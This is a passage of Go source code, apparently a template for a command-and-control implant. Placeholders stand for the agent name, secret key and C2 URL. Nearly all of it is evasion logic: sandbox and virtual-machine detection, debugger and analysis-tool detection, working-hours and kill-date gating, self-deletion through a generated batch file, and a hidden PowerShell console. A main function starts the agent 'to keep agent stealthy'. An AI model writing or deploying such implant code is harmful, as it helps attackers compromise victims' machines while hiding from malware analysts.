		   strings.Contains(os.Getenv("COMPUTERNAME"), "SND") {
			return true
		}
	}

	if totalRAM > 0 && totalRAM < 2*1024*1024*1024 { // Less than 2GB
		return true
	}

	hostname, _ := os.Hostname()
	hostnameLower := strings.ToLower(hostname)
	sandboxIndicators := []string{
		"sandbox", "malware", "detected", "test",
		"cuckoo", "malbox", "innotek",
		"virtual", "vmware", "vbox", "xen",
	}
	for _, indicator := range sandboxIndicators {
		if strings.Contains(hostnameLower, indicator) {
			return true
		}
	}

	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	if username == "" {
		username = "unknown"
	}
	usernameLower := strings.ToLower(username)
	suspiciousUsers := []string{"sandbox", "malware", "user", "test", "admin"}
	for _, user := range suspiciousUsers {
		if usernameLower == user {
			return true
		}
	}

	interfaces, err := net.Interfaces()
	if err == nil {
		virtualMacPrefixes := []string{"08:00:27", "00:0c:29", "00:50:56", "00:1c:42", "52:54:00"}
		for _, iface := range interfaces {
			mac := iface.HardwareAddr.String()
			mac = strings.ToLower(mac)
			for _, prefix := range virtualMacPrefixes {
				if strings.HasPrefix(mac, prefix) {
					return true
				}
			}
		}
	}

	if runtime.GOOS == "linux" {
		if a.{AGENT_CHECK_PROCESSES_FOR_SANDBOX_FUNC}() {
			return true
		}
	} else if runtime.GOOS == "windows" {
		if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() {
			return true
		}
	}

	currentPath, _ := os.Getwd()
	currentPath = strings.ToLower(currentPath)
	suspiciousPaths := []string{
		"vmware", "virtualbox", "vbox",
		"sandbox", "cuckoo", "cape", "malware",
	}
	for _, path := range suspiciousPaths {
		if strings.Contains(currentPath, path) {
			return true
		}
	}

	envSandboxIndicators := []string{
		"SANDBOX", "CUCKOO", "CAPE", "MALWARE",
		"VIRUSTOTAL", "HYBRID", "ANYRUN",
	}
	for _, envVar := range envSandboxIndicators {
		if os.Getenv(envVar) != "" || os.Getenv(strings.ToLower(envVar)) != "" {
			return true
		}
	}

	if runtime.GOOS == "linux" {
		if data, err := ioutil.ReadFile("/proc/uptime"); err == nil {
			parts := strings.Fields(string(data))
			if len(parts) > 0 {
				if uptime, err := strconv.ParseFloat(parts[0], 64); err == nil {
					if uptime < 300 { // Less than 5 minutes
						return true
					}
				}
			}
		}
	}

	suspiciousFiles := []string{
		"C:\\windows\\temp\\vmware_trace.log",  // VMware
		"C:\\windows\\temp\\VirtualBox.log",   // VirtualBox
		"C:\\windows\\system32\\drivers\\VBoxMouse.sys",  // VBox
		"/tmp/vmware_trace.log",  // VMware on Linux
		"/tmp/vbox_mouse.log",    // VBox on Linux
	}
	for _, file := range suspiciousFiles {
		if _, err := os.Stat(file); err == nil {
			return true // File exists
		}
	}

	if a.{AGENT_CHECK_NETWORK_TOOLS_FUNC}() {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WORKING_HOURS_FUNC}() bool {
	now := time.Now()
	if a.{AGENT_WORKING_HOURS_FIELD}.Timezone == "UTC" {
		// Use UTC time
		now = now.UTC()
	} else {
		// Use local time for other timezones (for simplicity)
		// Later on, We might want to parse the timezone
	}

	// Check if current day is in the allowed working days
	// Go's Weekday: 0=Sunday, 1=Monday, 2=Tuesday, etc.
	currentWeekday := int(now.Weekday())
	if currentWeekday == 0 {
		currentWeekday = 7 // Sunday is day 7 in our config (1-7 for Monday-Sunday)
	}

	allowed := false
	for _, day := range a.{AGENT_WORKING_HOURS_FIELD}.Days {
		if day == currentWeekday {
			allowed = true
			break
		}
	}

	if !allowed {
		return false
	}

	// Check if current hour is within working hours
	currentHour := now.Hour()
	if currentHour >= a.{AGENT_WORKING_HOURS_FIELD}.StartHour && currentHour < a.{AGENT_WORKING_HOURS_FIELD}.EndHour {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_KILL_DATE_FUNC}() bool {
	killTime, err := time.Parse("2006-01-02T15:04:05Z", a.{AGENT_KILL_DATE_FIELD})
	if err != nil {
		// If we can't parse the kill date, assume no kill date (return false to not kill)
		return false
	}

	now := time.Now().UTC()
	return now.After(killTime)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_PROCESSES_FOR_SANDBOX_FUNC}() bool {
	cmd := exec.Command("ps", "aux")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	processes := string(output)
	sandboxProcesses := []string{
		"cape", "fakenet", "wireshark", "tcpdump", "ollydbg",
		"x32dbg", "x64dbg", "ida", "gdb", "devenv", "procmon",
		"procexp", "sniff", "netmon", "apimonitor", "regmon",
		"filemon", "immunity", "windbg", "fiddler",
	}

	for _, proc := range sandboxProcesses {
		if strings.Contains(strings.ToLower(processes), proc) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() bool {
	cmd := exec.Command("tasklist")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	processes := string(output)
	sandboxProcesses := []string{
		"cape", "fakenet", "wireshark", "tcpdump", "ollydbg",
		"x32dbg", "x64dbg", "ida", "gdb", "devenv", "procmon",
		"procexp", "sniff", "netmon", "apimonitor", "regmon",
		"filemon", "immunity", "windbg", "fiddler", "apimon",
		"regmon", "filemon", "sbox", "sandboxie",
	}

	for _, proc := range sandboxProcesses {
		if strings.Contains(strings.ToLower(processes), strings.ToLower(proc)) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_NETWORK_TOOLS_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	var processes string

	if runtime.GOOS == "linux" {
		cmd := exec.Command("ps", "aux")
		output, err := cmd.Output()
		if err != nil {
			return false
		}
		processes = string(output)
	} else if runtime.GOOS == "windows" {
		cmd := exec.Command("tasklist")
		output, err := cmd.Output()
		if err != nil {
			return false
		}
		processes = string(output)
	} else {
		return false // Not supported on this platform
	}

	networkTools := []string{
		"wireshark", "tcpdump", "tshark", "netsniff", "ettercap", "burp", "mitmproxy",
		"fiddler", "charles", "netcat", "ncat", "socat", "nmap", "zmap", "masscan",
		"theharvester", "maltego", "nessus", "openvas", "nessusd", "snort", "suricata",
		"procmon", "procexp",
	}

	for _, tool := range networkTools {
		if strings.Contains(strings.ToLower(processes), tool) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_DEBUGGERS_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	if runtime.GOOS == "linux" {
		statusPath := fmt.Sprintf("/proc/%d/status", os.Getpid())
		if data, err := ioutil.ReadFile(statusPath); err == nil {
			lines := strings.Split(string(data), "\n")
			for _, line := range lines {
				if strings.HasPrefix(line, "TracerPid:") {
					parts := strings.Fields(line)
					if len(parts) >= 2 {
						pid := strings.TrimSpace(parts[1])
						if pid != "0" {
							return true // Being traced
						}
					}
				}
			}
		}
	}

	if runtime.GOOS == "linux" {
		if a.{AGENT_CHECK_PROCESSES_FOR_DEBUGGERS_FUNC}() {
			return true
		}
	} else if runtime.GOOS == "windows" {
		if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() {
			return true
		}

		if a.{AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() {
			return true
		}
	}

	start := time.Now()
	time.Sleep(10 * time.Millisecond)
	actualSleep := time.Since(start)
	expectedSleep := 10 * time.Millisecond
	if actualSleep < expectedSleep/2 || actualSleep > expectedSleep*2 {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_PROCESSES_FOR_DEBUGGERS_FUNC}() bool {
	cmd := exec.Command("ps", "aux")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	processes := string(output)
	debuggerProcesses := []string{
		"gdb", "gdbserver", "ollydbg", "x32dbg", "x64dbg", "ida", "windbg",
		"immunity", "devenv", "vsdebug", "msvsmon", "apimonitor", "regmon", "filemon",
	}

	for _, dbg := range debuggerProcesses {
		if strings.Contains(strings.ToLower(processes), dbg) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() bool {
	cmd := exec.Command("tasklist")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	processes := string(output)
	debuggerProcesses := []string{
		"gdb", "gdbserver", "ollydbg", "x32dbg", "x64dbg", "ida", "windbg",
		"immunity", "devenv", "vsdebug", "msvsmon", "apimonitor", "regmon", "filemon",
	}

	for _, dbg := range debuggerProcesses {
		if strings.Contains(strings.ToLower(processes), strings.ToLower(dbg)) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() bool {
	if runtime.GOOS != "windows" || a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command",
		"[System.Diagnostics.Debugger]::IsDebuggerPresent()")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	result := strings.TrimSpace(string(output))
	if strings.Contains(strings.ToLower(result), "true") {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
	executable, err := os.Executable()
	if err != nil {
		os.Exit(0)
		return
	}

	go func() {
		time.Sleep(100 * time.Millisecond) // Brief delay to ensure process exits

		if runtime.GOOS == "windows" {
			batchScript := fmt.Sprintf("@echo off\nping -n 2 127.0.0.1 > nul\ndel \"%s\"\n", executable)
			batchFile := executable + ".bat"

			if err := ioutil.WriteFile(batchFile, []byte(batchScript), 0644); err != nil {
				os.Remove(executable)
				os.Exit(0)
				return
			}

			exec.Command("cmd", "/C", "start", "/min", batchFile).Start()
		} else {
			os.Remove(executable)
		}

		os.Exit(0)
	}()
}

func {AGENT_HIDE_CONSOLE_FUNC}() {
	// Hide console window on Windows
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", "try { Add-Type -Name Win32 -Namespace Console -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")]^ public static extern IntPtr GetConsoleWindow(); [DllImport(\\\"user32.dll\\\")]^ public static extern bool ShowWindow(IntPtr hWnd^, int nCmdShow);'; $consolePtr = [Console.Win32]::GetConsoleWindow(); [Console.Win32]::ShowWindow($consolePtr, 0) } catch { }")
		_ = cmd.Run() // Run command but ignore errors
	}
}

func main() {
	// Hide console if on Windows
	if runtime.GOOS == "windows" {
		{AGENT_HIDE_CONSOLE_FUNC}()
	}

	agentID := "{AGENT_ID}"
	secretKey := "{SECRET_KEY}"
	c2URL := "{C2_URL}"
	disableSandbox := {DISABLE_SANDBOX} // Will be true or false based on generation flag

	// Removed debug prints to keep agent stealthy

	agent, err := New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, disableSandbox)
	if err != nil {
		// fmt.Printf("[DEBUG] Failed to create agent: %v\n", err)
		os.Exit(1)
	}

	// fmt.Println("[DEBUG] Starting agent main loop...")
	agent.{AGENT_RUN_FUNC}()
}
